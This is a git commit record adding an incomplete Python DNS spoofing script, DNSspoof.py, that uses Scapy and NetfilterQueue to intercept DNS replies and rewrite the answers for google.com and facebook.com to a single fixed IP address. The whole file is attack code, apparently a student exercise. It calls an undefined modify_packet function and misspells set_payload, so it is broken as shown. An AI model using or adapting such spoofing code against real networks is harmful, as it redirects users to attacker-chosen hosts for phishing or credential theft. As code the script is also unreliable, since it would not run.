0051c6f032fe199537945a425602245cb8a2dcb2
Sriram19g <sriramg.cs2023@citchennai.net>
2024-10-01 17:28:36 +0530

    [DNS file] process from NFQUE packet to Scapy packet🦾

---
+++ DNSspoof.py
@@ -0,0 +1,28 @@
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+import os
+
+#defining dns directory
+
+dns_hosts={
+    b"www.google.com.":"172.67.145.12",
+    b"google.com.":"172.67.145.12",
+    b"facebook.com":"172.67.145.12"
+}
+
+def process_packet(packet):
+    #convert netfilter queue packet to scapy packet
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        #if the packet is a DNS Resource Record (DNS reply)
+        #modify the packet
+        print("[BEFORE]:",scapy_packet.summary())
+        try:
+            scapy_packet=modify_packet(scapy_packet)
+        except IndexError:
+            pass
+        print("[AFTER]:",scapy_packet.summary())
+        #set back as netfilter queue packet
+        packet.set_paylaod(bytes(scapy_packet))
+    
+    packet.accept()
